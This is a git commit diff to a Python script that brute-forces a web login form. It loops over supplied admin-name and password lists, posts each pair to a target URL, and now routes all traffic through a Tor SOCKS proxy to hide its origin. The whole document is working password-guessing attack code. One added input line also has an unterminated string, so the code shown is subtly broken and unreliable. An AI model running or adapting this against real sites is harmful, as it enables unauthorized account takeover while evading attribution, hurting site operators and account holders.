bd4d10afd1cd131a0c05409242f887df9d7e442a
Dev. Gautam Kumar <111997815+devsdenepal@users.noreply.github.com>
2023-04-03 09:34:43 +0000

    use tor type script as main script

--- main.py
+++ main.py
@@ -1,15 +1,21 @@
 import requests
 import time
+import socks
+import socket
+
+# Set up Tor proxy
+socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
+socket.socket = socks.socksocket
 
 admin_el = []
 psd = []
 i = 0
-proxies_list = []
 a_url = input("Testing URL: ")
+uid_param = input('Username or UserId parameter name: ')
+#for ex: user_name
+password_param = input('Password parameter name: ;)
+#for ex: user_pass
 # read the list of proxies from the file
-proxy_list_path = input("Proxy Setup file path: ")
-with open(proxy_list_path,'r') as f:
-    proxies_list = [line.strip() for line in f]
 
 admin_list_file = input("Admin list path: ")
 with open(admin_list_file,'r') as admin_list_file :
@@ -23,29 +29,22 @@ with open(password_list_file, 'r') as f:
 for admin in admin_el:
     for password in psd:
         print("Trying: {} with password {}".format(admin, password))
-        for proxy in proxies_list:
-            # create a dictionary with the proxy information
-            proxy_dict = {
-                'http': 'http://' + proxy,
-                'https': 'https://' + proxy
-            }
-            params = {
-                'user_name': admin,
-                'user_pass': password
-            }
-            try:
-                response = requests.post(a_url, params=params, proxies=proxy_dict, allow_redirects=True)
-                if response.status_code == 200:
-                    print('REQUEST-POSTED!\n=== The fetched response is: \n')
-                    print(response.content)
-                elif response.status_code in [301, 302]:
-                    print('Redirection detected!\n=== The fetched response is: \n')
-                    print(response.headers['Location'])
-                else:
-                    print('Error while sending request!\n=== Details of Failure ===\n')
-                    print(response.status_code)
-                break  # break the loop if the request was successful
-            except requests.exceptions.RequestException:
-                print('Failed to connect to proxy: {}'.format(proxy))
+        params = {
+                uid_param : admin,
+                password_param : password
+        }
+        try:
+            response = requests.post(a_url, params=params, allow_redirects=True)
+            if response.status_code == 200:
+                print('REQUEST-POSTED!\n=== The fetched response is: \n')
+                print(response.content)
+            elif response.status_code in [301, 302]:
+                print('Redirection detected!\n=== The fetched response is: \n')
+                print(response.headers['Location'])
+            else:
+                 print('Error while sending request!\n=== Details of Failure ===\n')
+                 print(response.status_code)
+        except requests.exceptions.RequestException:
+                print('Failed to make request')
                # print(requests.exception.RequestException)
         time.sleep(1)
